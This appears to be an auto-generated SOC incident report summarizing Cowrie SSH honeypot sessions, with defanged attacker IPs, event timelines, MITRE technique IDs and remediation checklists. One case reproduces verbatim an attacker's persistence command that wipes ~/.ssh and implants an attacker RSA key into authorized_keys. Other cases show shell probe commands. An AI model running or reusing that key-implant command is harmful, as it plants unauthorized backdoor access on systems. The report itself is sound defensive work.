| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b94ffcb09f9fbd09704107b63ccb2211_small_control'"'"' '"'"'check_b94ffcb09f9fbd09704107b63ccb2211'"'"'', printf '\n%s|%s\n' 'check_b94ffcb09f9fbd09704107b63ccb2211_small_control' 'check_b94ffcb09f9fbd09704107b63ccb2211', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b94ffcb09f9fbd09704107b63ccb2211_small_math'"'"' "$((581*274+7))"', (581*274+7, printf '\n%s|%s\n' 'check_b94ffcb09f9fbd09704107b63ccb2211_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:18:21` | `cowrie.session.connect` |
| `2026-11-06 04:18:21` | `cowrie.client.version` |
| `2026-11-06 04:18:21` | `cowrie.client.kex` |
| `2026-11-06 04:18:23` | `cowrie.login.success` |
| `2026-11-06 04:18:24` | `cowrie.client.size` |
| `2026-11-06 04:18:25` | `cowrie.session.params` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| `2026-11-06 04:18:26` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45bd4463beda

| Field | Detail |
|---|---|
| **Source IP** | `120.48.176[.]103` |
| **First Seen** | 2026-11-06 04:18 |
| **Last Seen** | 2026-11-06 04:22 |
| **Session Duration** | 249s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:18:44` | `cowrie.session.connect` |
| `2026-11-06 04:18:44` | `cowrie.client.version` |
| `2026-11-06 04:18:44` | `cowrie.client.kex` |
| `2026-11-06 04:18:45` | `cowrie.login.success` |
| `2026-11-06 04:18:46` | `cowrie.session.params` |
| `2026-11-06 04:18:46` | `cowrie.command.input` |
| `2026-11-06 04:18:46` | `cowrie.command.failed` |
| `2026-11-06 04:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.176[.]103` to AbuseIPDB if not already reported
- [ ] Block `120.48.176[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be548c53474b

| Field | Detail |
|---|---|
| **Source IP** | `179.126.184[.]196` |
| **First Seen** | 2026-11-06 04:20 |
| **Last Seen** | 2026-11-06 04:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:20:06` | `cowrie.session.connect` |
| `2026-11-06 04:20:06` | `cowrie.client.version` |
| `2026-11-06 04:20:06` | `cowrie.client.kex` |
| `2026-11-06 04:20:07` | `cowrie.login.success` |
| `2026-11-06 04:20:08` | `cowrie.session.params` |
| `2026-11-06 04:20:08` | `cowrie.command.input` |
| `2026-11-06 04:20:08` | `cowrie.command.failed` |
| `2026-11-06 04:20:08` | `cowrie.log.closed` |
| `2026-11-06 04:20:09` | `cowrie.session.params` |
| `2026-11-06 04:20:09` | `cowrie.command.input` |
| `2026-11-06 04:20:09` | `cowrie.session.file_download` |
| `2026-11-06 04:20:09` | `cowrie.log.closed` |
| `2026-11-06 04:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.126.184[.]196` to AbuseIPDB if not already reported
- [ ] Block `179.126.184[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012749cc5c34

| Field | Detail |
|---|---|
| **Source IP** | `179.126.184[.]196` |
| **First Seen** | 2026-11-06 04:20 |
| **Last Seen** | 2026-11-06 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:20:09` | `cowrie.session.connect` |
| `2026-11-06 04:20:09` | `cowrie.client.version` |
| `2026-11-06 04:20:09` | `cowrie.client.kex` |
| `2026-11-06 04:20:10` | `cowrie.login.success` |
| `2026-11-06 04:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.126.184[.]196` to AbuseIPDB if not already reported
- [ ] Block `179.126.184[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83ca761ad566

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:20 |
| **Last Seen** | 2026-11-06 04:21 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_126e0c186d3e80004c22e7c0337276da_small_control'"'"' '"'"'check_126e0c186d3e80004c22e7c0337276da'"'"'', printf '\n%s|%s\n' 'check_126e0c186d3e80004c22e7c0337276da_small_control' 'check_126e0c186d3e80004c22e7c0337276da', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_126e0c186d3e80004c22e7c0337276da_small_math'"'"' "$((731*124+63))"', (731*124+63, printf '\n%s|%s\n' 'check_126e0c186d3e80004c22e7c0337276da_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:20:19` | `cowrie.session.connect` |
| `2026-11-06 04:20:20` | `cowrie.client.version` |
| `2026-11-06 04:20:20` | `cowrie.client.kex` |
| `2026-11-06 04:20:22` | `cowrie.login.success` |
| `2026-11-06 04:20:24` | `cowrie.client.size` |
| `2026-11-06 04:20:25` | `cowrie.session.params` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| `2026-11-06 04:20:25` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03d16cfcec4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:20 |
| **Last Seen** | 2026-11-06 04:21 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e491e6385ff46645bc1585aaab93f526_small_control'"'"' '"'"'check_e491e6385ff46645bc1585aaab93f526'"'"'', printf '\n%s|%s\n' 'check_e491e6385ff46645bc1585aaab93f526_small_control' 'check_e491e6385ff46645bc1585aaab93f526', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e491e6385ff46645bc1585aaab93f526_small_math'"'"' "$((688*468+23))"', (688*468+23, printf '\n%s|%s\n' 'check_e491e6385ff46645bc1585aaab93f526_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:20:26` | `cowrie.session.connect` |
| `2026-11-06 04:20:26` | `cowrie.client.version` |
| `2026-11-06 04:20:26` | `cowrie.client.kex` |
| `2026-11-06 04:20:29` | `cowrie.login.success` |
| `2026-11-06 04:20:30` | `cowrie.client.size` |
| `2026-11-06 04:20:31` | `cowrie.session.params` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| `2026-11-06 04:20:32` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b214cf3dbe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:22 |
| **Last Seen** | 2026-11-06 04:24 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_17ba1f283eac32b3d615bd36b16d44a0_small_control'"'"' '"'"'check_17ba1f283eac32b3d615bd36b16d44a0'"'"'', printf '\n%s|%s\n' 'check_17ba1f283eac32b3d615bd36b16d44a0_small_control' 'check_17ba1f283eac32b3d615bd36b16d44a0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_17ba1f283eac32b3d615bd36b16d44a0_small_math'"'"' "$((93*49+61))"', (93*49+61, printf '\n%s|%s\n' 'check_17ba1f283eac32b3d615bd36b16d44a0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:22:27` | `cowrie.session.connect` |
| `2026-11-06 04:22:27` | `cowrie.client.version` |
| `2026-11-06 04:22:27` | `cowrie.client.kex` |
| `2026-11-06 04:22:31` | `cowrie.login.success` |
| `2026-11-06 04:22:33` | `cowrie.client.size` |
| `2026-11-06 04:22:34` | `cowrie.session.params` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| `2026-11-06 04:22:35` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee55716059d2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:22 |
| **Last Seen** | 2026-11-06 04:23 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_965e9eb7af2a3a8f8b4bd821c135f810_small_control'"'"' '"'"'check_965e9eb7af2a3a8f8b4bd821c135f810'"'"'', printf '\n%s|%s\n' 'check_965e9eb7af2a3a8f8b4bd821c135f810_small_control' 'check_965e9eb7af2a3a8f8b4bd821c135f810', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_965e9eb7af2a3a8f8b4bd821c135f810_small_math'"'"' "$((609*1+83))"', (609*1+83, printf '\n%s|%s\n' 'check_965e9eb7af2a3a8f8b4bd821c135f810_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:22:27` | `cowrie.session.connect` |
| `2026-11-06 04:22:27` | `cowrie.client.version` |
| `2026-11-06 04:22:27` | `cowrie.client.kex` |
| `2026-11-06 04:22:29` | `cowrie.login.success` |
| `2026-11-06 04:22:31` | `cowrie.client.size` |
| `2026-11-06 04:22:31` | `cowrie.session.params` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| `2026-11-06 04:22:32` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97613d61e5a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:24 |
| **Last Seen** | 2026-11-06 04:26 |
| **Session Duration** | 107s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1e298e385a7d281811b7dc7253cd70c3_small_control'"'"' '"'"'check_1e298e385a7d281811b7dc7253cd70c3'"'"'', printf '\n%s|%s\n' 'check_1e298e385a7d281811b7dc7253cd70c3_small_control' 'check_1e298e385a7d281811b7dc7253cd70c3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1e298e385a7d281811b7dc7253cd70c3_small_math'"'"' "$((743*733+59))"', (743*733+59, printf '\n%s|%s\n' 'check_1e298e385a7d281811b7dc7253cd70c3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:24:24` | `cowrie.session.connect` |
| `2026-11-06 04:24:25` | `cowrie.client.version` |
| `2026-11-06 04:24:25` | `cowrie.client.kex` |
| `2026-11-06 04:24:29` | `cowrie.login.success` |
| `2026-11-06 04:24:31` | `cowrie.client.size` |
| `2026-11-06 04:24:32` | `cowrie.session.params` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| `2026-11-06 04:24:33` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db5fe4e839d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:26 |
| **Last Seen** | 2026-11-06 04:27 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_55733df35761ebf4c781ae32a19df50a_small_control'"'"' '"'"'check_55733df35761ebf4c781ae32a19df50a'"'"'', printf '\n%s|%s\n' 'check_55733df35761ebf4c781ae32a19df50a_small_control' 'check_55733df35761ebf4c781ae32a19df50a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_55733df35761ebf4c781ae32a19df50a_small_math'"'"' "$((939*4+51))"', (939*4+51, printf '\n%s|%s\n' 'check_55733df35761ebf4c781ae32a19df50a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:26:35` | `cowrie.session.connect` |
| `2026-11-06 04:26:36` | `cowrie.client.version` |
| `2026-11-06 04:26:36` | `cowrie.client.kex` |
| `2026-11-06 04:26:39` | `cowrie.login.success` |
| `2026-11-06 04:26:40` | `cowrie.client.size` |
| `2026-11-06 04:26:41` | `cowrie.session.params` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| `2026-11-06 04:26:42` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6687096e96b9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:28 |
| **Last Seen** | 2026-11-06 04:31 |
| **Session Duration** | 223s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bbeb99ff88f69455799bf021c6721999_small_control'"'"' '"'"'check_bbeb99ff88f69455799bf021c6721999'"'"'', printf '\n%s|%s\n' 'check_bbeb99ff88f69455799bf021c6721999_small_control' 'check_bbeb99ff88f69455799bf021c6721999', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bbeb99ff88f69455799bf021c6721999_small_math'"'"' "$((252*775+93))"', (252*775+93, printf '\n%s|%s\n' 'check_bbeb99ff88f69455799bf021c6721999_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:28:16` | `cowrie.session.connect` |
| `2026-11-06 04:28:17` | `cowrie.client.version` |
| `2026-11-06 04:28:17` | `cowrie.client.kex` |
| `2026-11-06 04:28:23` | `cowrie.login.success` |
| `2026-11-06 04:28:26` | `cowrie.client.size` |
| `2026-11-06 04:28:28` | `cowrie.session.params` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| `2026-11-06 04:28:29` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00c568e647c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:28 |
| **Last Seen** | 2026-11-06 04:29 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_716c4eb45983385dbef6c89026ca9267_small_control'"'"' '"'"'check_716c4eb45983385dbef6c89026ca9267'"'"'', printf '\n%s|%s\n' 'check_716c4eb45983385dbef6c89026ca9267_small_control' 'check_716c4eb45983385dbef6c89026ca9267', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_716c4eb45983385dbef6c89026ca9267_small_math'"'"' "$((124*329+34))"', (124*329+34, printf '\n%s|%s\n' 'check_716c4eb45983385dbef6c89026ca9267_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:28:33` | `cowrie.session.connect` |
| `2026-11-06 04:28:33` | `cowrie.client.version` |
| `2026-11-06 04:28:33` | `cowrie.client.kex` |
| `2026-11-06 04:28:35` | `cowrie.login.success` |
| `2026-11-06 04:28:37` | `cowrie.client.size` |
| `2026-11-06 04:28:38` | `cowrie.session.params` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| `2026-11-06 04:28:38` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62fad58ac9ba

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:30 |
| **Last Seen** | 2026-11-06 04:31 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_076a7b348a8fe8cb26919f88c3736ec9_small_control'"'"' '"'"'check_076a7b348a8fe8cb26919f88c3736ec9'"'"'', printf '\n%s|%s\n' 'check_076a7b348a8fe8cb26919f88c3736ec9_small_control' 'check_076a7b348a8fe8cb26919f88c3736ec9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_076a7b348a8fe8cb26919f88c3736ec9_small_math'"'"' "$((902*820+56))"', (902*820+56, printf '\n%s|%s\n' 'check_076a7b348a8fe8cb26919f88c3736ec9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:30:30` | `cowrie.session.connect` |
| `2026-11-06 04:30:30` | `cowrie.client.version` |
| `2026-11-06 04:30:30` | `cowrie.client.kex` |
| `2026-11-06 04:30:33` | `cowrie.login.success` |
| `2026-11-06 04:30:34` | `cowrie.client.size` |
| `2026-11-06 04:30:34` | `cowrie.session.params` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| `2026-11-06 04:30:35` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (141) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-c78b0a4fcfff | HIGH | `2.57.122[.]209` | 2026-11-06 04:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cf4dbd34f629 | HIGH | `2.57.122[.]209` | 2026-11-06 04:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7b23ca7989b1 | HIGH | `35.210.36[.]43` | 2026-11-06 04:34 | Y | 2 | 0 | `T1078` |
| IR-77ca381ca7fe | HIGH | `35.210.36[.]43` | 2026-11-06 04:34 | Y | 1 | 0 | `T1078` |
| IR-cc2bc4ac8c08 | HIGH | `35.210.36[.]43` | 2026-11-06 04:34 | Y | 0 | 0 | `T1078` |
| IR-b09f6d5f14b4 | HIGH | `2.57.122[.]209` | 2026-11-06 04:36 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0363dee2650b | HIGH | `2.57.122[.]209` | 2026-11-06 04:38 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8892248818b9 | HIGH | `2.57.122[.]209` | 2026-11-06 04:40 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-de93cc77f148 | HIGH | `2.57.122[.]209` | 2026-11-06 04:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-98a3c53c6c04 | HIGH | `141.94.26[.]113` | 2026-11-06 04:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bec49863ca72 | HIGH | `141.94.26[.]113` | 2026-11-06 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fa59f08959f9 | HIGH | `2.57.122[.]209` | 2026-11-06 04:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bb204038a9ae | HIGH | `2.57.122[.]209` | 2026-11-06 04:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d4358e641ba5 | HIGH | `35.210.184[.]225` | 2026-11-06 04:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b78551ed463f | HIGH | `103.187.165[.]26` | 2026-11-06 04:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d03f120fa79a | HIGH | `2.57.122[.]209` | 2026-11-06 04:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5066dbf60257 | HIGH | `103.187.165[.]26` | 2026-11-06 04:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-da3c37b7a498 | HIGH | `52.233.193[.]61` | 2026-11-06 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-96f27a336f80 | HIGH | `52.233.193[.]61` | 2026-11-06 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7ce492b813f | HIGH | `176.53.159[.]196` | 2026-11-06 05:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-49f16eac700c | HIGH | `113.161.39[.]122` | 2026-11-06 05:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f4ba5e8e01a5 | HIGH | `113.161.39[.]122` | 2026-11-06 05:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-357d8abbc94b | HIGH | `35.210.156[.]19` | 2026-11-06 05:15 | Y | 2 | 0 | `T1078` |
| IR-1a32d94201b7 | HIGH | `35.210.156[.]19` | 2026-11-06 05:15 | Y | 1 | 0 | `T1078` |
| IR-bd78853feed8 | HIGH | `35.210.156[.]19` | 2026-11-06 05:15 | Y | 0 | 0 | `T1078` |
